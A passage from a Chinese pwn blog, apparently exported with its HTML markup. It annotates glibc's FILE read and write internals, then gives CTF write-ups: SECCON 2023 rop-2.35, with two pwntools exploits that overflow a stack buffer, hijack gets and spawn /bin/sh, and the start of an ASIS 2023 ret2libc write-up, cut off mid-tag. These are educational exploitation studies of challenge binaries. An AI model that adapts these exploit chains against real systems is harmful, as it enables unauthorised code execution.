<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><ol><li><p>如果buf为null</p><ul><li>如果savebase不为null,先将其释放并取消’在备份’标志位</li><li>调用doallocbuf申请缓冲区</li></ul></li><li><p>循环,条件为当需要的数据want大于0</p><ul><li><p>如果want不多于read缓冲区中拥有的数据,直接将缓冲区中的数据转移到内存,并调整gptr</p></li><li><p>否则如果want&gt;have</p><ul><li>如果have大于0,先将have中的数据转移到内存</li><li>如果处于备份模式,调用_IO_switch_to_main_get_area (fp);并结束当次循环</li><li>如果buf不为空且want小于缓冲区容量,调用underflow,若返回EOF则跳出循环,否则结束此次循环</li><li>如果缓冲区异常或者want大于缓冲区容量<ul><li>设置pptr和gptr</li><li>如果缓冲区存在且缓冲区大于128则count -= want % block_size;,即将超过缓冲区的部分直接调用系统调用读取,剩余部分则在下一次循环完成</li><li>调用系统调用read(fp, s, count),如果上一步没有修改count,那么这一步就可以直接调用系统调用read读取所有的内容,并且是直接读到目标区域不经过缓冲区,根据返回值有:<ul><li>如果返回为0,则设置文件标志为到达文件末尾,否则设置为发生错误,返回值小于0则设置错误标志位,两种情况下,都会跳出循环</li><li>返回值大于0,则继续向下执行</li></ul></li><li>s += count;want -= count;如果文件偏移不在末尾则调整offset</li><li>再次开始循环,进行前面的操作</li></ul></li></ul></li></ul></li></ol><ol><li>返回n-want(即读入的量)</li></ol><h2 id="xspuntn"><a href="#xspuntn" class="headerlink" title="xspuntn"></a>xspuntn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;<span class="comment">//绕过缓冲区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><ol><li>如果n小于等于0直接返回</li><li>如果文件时行缓冲且正处于写入模式<ul><li>如果b-end—w-ptr大于n,从要写入数据的末尾开始查找’\n’符,如果找到了设置count为’\n’字符前的数据长度,并将must_flush 置 1</li></ul></li><li>否则count=w_end - w_ptr</li><li>如果count大于0<ul><li>如果count&gt;todo,count=todo</li><li>将内存中的数据转移到缓冲区</li><li>s += count;to_do -= count;</li></ul></li><li>如果to_do + must_flush &gt; 0<ul><li>调用overflow,若返回EOF,则返回to_do == 0 ? EOF : n - to_do;</li><li>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</li><li>如果do_write大于0,调用new_do_write (f, s, do_write);写多余的<ul><li>如果写入数量小于do_write,返回n - to_do</li></ul></li><li>如果to_do还有剩,调用_IO_default_xsputn (f, s+do_write, to_do);</li></ul></li></ol><p>看_IO_default_xsputn (f, s+do_write, to_do);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="type">ssize_t</span> i;</span><br><span class="line">      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><ol><li>如果more小于等于0直接返回0</li><li>循环<ul><li>如果f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end<ul><li>如果count&gt;more,count = more;</li><li>如果count&gt;20,将内存中的数据移动到缓冲区</li><li>否则如果count不为0但小于20,将内存中的数据逐个复制到缓冲区</li><li>如果more=0或者_IO_OVERFLOW (f, (unsigned char) *s++) == EOF结束循环,more!=0才会执行_IO_OVERFLOW,原因是因为前面已经填满了缓冲区需要刷新,其会单独往缓冲区写入一个字符(原本是处理行缓冲的机制),所以下面要more—</li><li>否则more—</li></ul></li></ul></li><li>返回n-more</li></ol><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><ol><li>综上可以看出缓冲区模式,对读取过程并没有什么影响,对写入过程的影响则要更大,不过都受到上层函数影响</li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> _IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赛题录</title>
      <link href="/posts/26406/"/>
      <url>/posts/26406/</url>
      
        <content type="html"><![CDATA[<h1 id="2023seccon-rop-2-35"><a href="#2023seccon-rop-2-35" class="headerlink" title="2023seccon-rop-2.35"></a>2023seccon-rop-2.35</h1><p><strong>标签:栈溢出|栈迁移|got劫持|rop</strong></p><p><strong>题目介绍:</strong>The number of ROP gadgets is declining worldwide.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;echo Enter something:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序就两行代码</p><p>汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401156                               public main</span><br><span class="line">.text:0000000000401156                               main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               var_10= byte ptr -10h</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; __unwind &#123;</span><br><span class="line">.text:0000000000401156 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000000000040115A 55                            push    rbp</span><br><span class="line">.text:000000000040115B 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000040115E 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br><span class="line">.text:000000000040117D</span><br><span class="line">.text:0000000000401182 90                            nop</span><br><span class="line">.text:0000000000401183 C9                            leave</span><br><span class="line">.text:0000000000401184 C3                            retn</span><br><span class="line">.text:0000000000401184                               ; &#125; // starts at 401156</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               main endp</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               _text ends</span><br><span class="line">.text:0000000000401184</span><br></pre></td></tr></table></figure><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>保护基本不用考虑</p><p>常规思路自然是泄露libc等</p><p>不过这题程序没有单独使用过输出函数</p><p>唯一一次输出使用system实现的</p><p>因此根本无法做到泄露</p><hr><p>第一次错误想法:</p><p>如下,可以发现gets的参数是由rbp确定的(rbp-0x10)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>那么修改rbp就可以做到任意写了</p><p>看到以下这段代码,升起了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>修改command处字符串为/bin/sh</p><p>之后再rop到代码中执行system处</p><p>并在此之前做栈迁移,防止system栈越界</p><p>不过这个想法直接胎死腹中了</p><p>因为command所在段根本没有写权限</p><hr><p>第二个思路:</p><p>同样是利用gets参数由rbp确定的</p><p>可以看到gets参数可控,system参数不可控</p><p>但如果把<strong>gets函数劫持为system</strong></p><p>那就可以<strong>执行可控参数的system函数</strong>了</p><p>具体实施:</p><p>首先栈溢出让程序再次执行以一次gets(返回时leave已经修改rbp为可写gets的got表处)</p><p>这样在第二次gets的时候修改gets的got表为</p><p>system@plt+binsh字符串+目标rbp+lr+填充padding+binsh地址+0x10+0x401171</p><p>为了让system栈不越界还得再次栈迁移将栈往高处迁移</p><p>并将rbp控制位为-0x10刚好为binsh字符串</p><p>这样返回执行以下代码时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>实际上执行的就是system(‘/bin/sh’)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;rop-2-35.seccon.games&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">rbp1=<span class="number">0x404030</span></span><br><span class="line">pr=<span class="number">0x40113d</span></span><br><span class="line">gets=<span class="number">0x401171</span></span><br><span class="line">lr=<span class="number">0x401183</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp1)+p64(gets))</span><br><span class="line">p.sendline(p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x404800</span>)+p64(lr)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7c0</span>+p64(<span class="number">0x404038</span>)+p64(gets))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="其它题解"><a href="#其它题解" class="headerlink" title="其它题解"></a>其它题解</h2><p>赛后发现这个题解更简单暴力</p><p>利用了main函数在返回时rdi是一个可写的地址(这就要去观察了,光理论分析要分析出有点难度)</p><p>于是在返回时直接调用gets@plt</p><p>然后又利用gets的返回值就是指向输入字符串的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>再加上面的gadget</p><p>就可以直接利用了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p, u = pack, unpack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rop-2-35.seccon.games&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x401110</span></span><br><span class="line">mov_rdi_rax_call_system = <span class="number">0x401169</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(mov_rdi_rax_call_system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;//////////////////bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive(prompt=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>至于为什么要这么多<code>/</code>,不是很清楚但能观察到输入的字符串前面的某一个字符会变成其<code>ascii-1</code>对应的字符,例如<code>/</code>变为<code>.</code>,如果直接填<code>/bin/sh\x00</code>会变为<code>/bim/sh\x00</code></p><h1 id="ASIS2023-hipwn"><a href="#ASIS2023-hipwn" class="headerlink" title="ASIS2023-hipwn"></a>ASIS2023-hipwn</h1><p><strong>标签:栈溢出|ret2libc|rop</strong></p><p><strong>题目介绍:</strong>can you pwn??</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nbytes[<span class="number">72</span>]; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much???&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok... now send content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;nbytes[<span class="number">4</span>], *(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes);</span><br><span class="line">    nbytes[*(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes + <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;nbytes[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wanna do it again?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)nbytes != <span class="number">0x539</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i knew it&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec,保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>很常规的一道<strong>ret2libc</strong>题,但踩了不少坑</p><p>实现如下:</p><ol><li>泄露canary</li><li>泄露程序加载基址</li><li>泄露libc</li><li>rop</li></ol><p>观察一下栈</p><p><img 